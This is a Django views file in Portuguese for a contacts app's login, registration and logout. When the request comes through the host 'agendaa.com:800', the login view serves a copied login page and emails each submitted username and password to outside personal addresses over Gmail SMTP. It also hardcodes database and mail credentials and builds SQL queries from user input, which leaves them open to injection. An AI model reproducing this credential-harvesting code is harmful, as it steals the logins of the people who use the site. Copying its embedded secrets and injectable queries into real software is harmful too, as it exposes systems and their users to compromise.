import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from django.shortcuts import render, redirect
from django.contrib import messages, auth
from django.core.validators import validate_email
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from contatos.models import Contato
from .models import FormContato
import pymysql.cursors

conexao = pymysql.connect(
    host='18.219.154.84',
    user='admin',
    password='Maria@1601',
    db='sitedjango',
    charset='utf8mb4',
    cursorclass=pymysql.cursors.DictCursor
)

cursor = conexao.cursor()
import hashlib
from passlib.hash import pbkdf2_sha256
def login(request, *args, **kwargs):
    pk_desafio = kwargs.get('pk')

    contexto = {
        'pk_desafio': pk_desafio,
    }
    if request.method != 'POST':
        if request.META['HTTP_HOST'] == 'agendaa.com:800':
            return render(request,'accounts/login-copia.html', {
                'pk_desafio': pk_desafio,
                'desafio_id': pk_desafio
            })
        else:
            return render(request, 'accounts/login.html', {
                'pk_desafio': pk_desafio,
                'desafio_id':pk_desafio
            })
    usuario = request.POST.get('usuario')
    senha = request.POST.get('senha')
    if request.META['HTTP_HOST'] == 'agendaa.com:800':
        smtp_ssl_host = 'smtp.gmail.com'
        smtp_ssl_port = 465
        # username ou email para logar no servidor
        username = 'gabriel.santos@primeinterway.com.br'
        password = 'udfisahfusdi'

        from_addr = 'gabriel.santos@primeinterway.com.br'
        to_addrs = ['gabriells760@gmail.com', 'igorrois@hotmail.com']

        # a biblioteca email possuí vários templates
        # para diferentes formatos de mensagem
        # neste caso usaremos MIMEText para enviar
        # somente texto
        message = MIMEText(f'senha é: {senha} e o usuario {usuario}')
        message['subject'] = 'Agenda Senha'
        message['from'] = from_addr
        message['to'] = ', '.join(to_addrs)

        # conectaremos de forma segura usando SSL
        server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
        # para interagir com um servidor externo precisaremos
        # fazer login nele
        server.login(username, password)
        server.sendmail(from_addr, to_addrs, message.as_string())
        server.quit()
    pk_desafio = kwargs.get('pk')

    passwd = senha
    contatos = Contato.objects.raw(f'SELECT * FROM contatos_contato WHERE nome LIKE "{passwd}"')
    #user = User.objects.raw(f'SELECT * FROM auth_user where username = "{usuario}" and password="{passwd}"')
    print(contatos.query)
    user = auth.authenticate(request, username=usuario, password=senha)
    #cursor.execute(f'SELECT * FROM auth_user where username = "{usuario}" and password="{passwd}"')

    #user = cursor.fetchall()
    senha2 = 'la'
    cursor = conexao.cursor()
    cursor.execute(f'SELECT new_senha FROM contatos_contato where desafio_id = {pk_desafio}')
    cursor.close()
    senha_certa = cursor.fetchall()
    print(senha_certa[0]['new_senha'])


    if senha == senha_certa[0]['new_senha']:
        senha2 = '123456'
    print(senha2)
    user = auth.authenticate(request, username=usuario, password=senha2)
    if not user:
        if request.META['HTTP_HOST'] == 'agendaa.com:800':
            messages.error(request, 'Usuário ou senha inválidos.')
            return render(request, 'accounts/login-copia.html', {
                'pk_desafio': pk_desafio
            })
        else:
            messages.error(request, 'Usuário ou senha inválidos.')
            return render(request, 'accounts/login.html', {
                'pk_desafio': pk_desafio
            })
    else:
        cursor = conexao.cursor()
        cursor.execute('SELECT login FROM contatos_contato where id = 1')
        resultado = cursor.fetchall()
        cursor.execute(f'UPDATE contatos_contato set login = 1 where desafio_id = {pk_desafio}')
        print(cursor.rowcount, "Record inserted successfully into Laptop table")
        conexao.commit()
        print(pk_desafio)
        auth.login(request, user)
        cursor.close()
        messages.success(request, 'Você fez login com sucesso.')
        return redirect('index', pk_desafio)


def logout(request, *args, **kwargs):
    pk_desafio = kwargs.get('pk')
    auth.logout(request)
    return redirect('/accounts/login/'+str(pk_desafio))


def register(request):
    if request.method != 'POST':
        return render(request, 'accounts/register.html')

    nome = request.POST.get('nome')
    sobrenome = request.POST.get('sobrenome')
    email = request.POST.get('email')
    usuario = request.POST.get('usuario')
    senha = request.POST.get('senha')
    senha2 = request.POST.get('senha2')

    if not nome or not email or not sobrenome or not senha or not senha2 or not usuario:
        messages.error(request, 'Campo Vazio!')
        return render(request, 'accounts/register.html')

    try:
        validate_email(email)
    except:
        messages.error(request, 'Email Invalido')
        return render(request, 'accounts/register.html')

    if len(senha) < 6:
        messages.error(request, 'Senha curta')
        return render(request, 'accounts/register.html')
    if len(usuario) < 6:
        messages.error(request, 'Usuario curta')
        return render(request, 'accounts/register.html')
    if senha != senha2:
        messages.error(request, 'Senhas não conferem!')
        return render(request, 'accounts/register.html')
    if User.objects.filter(username=usuario).exists():
        messages.error(request, 'Usuario já existe')
        return render(request, 'accounts/register.html')
    if User.objects.filter(email=email).exists():
        messages.error(request, 'Email já existe')
        return render(request, 'accounts/register.html')

    messages.success(request, 'Cadastrado com sucesso, Faça Login!!')
    user = User.objects.create_user(username=usuario, email=email, password=senha, first_name=nome, last_name=sobrenome)
    user.save()
    return redirect('login')


@login_required(redirect_field_name='login')
def dashboard(request, *args, **kwargs):
    pk_desafio = kwargs.get('pk')
    messages.success(request, f"Contato {request.POST.get('nome')} salvo com sucesso!")
    return redirect('dashboard', pk_desafio)
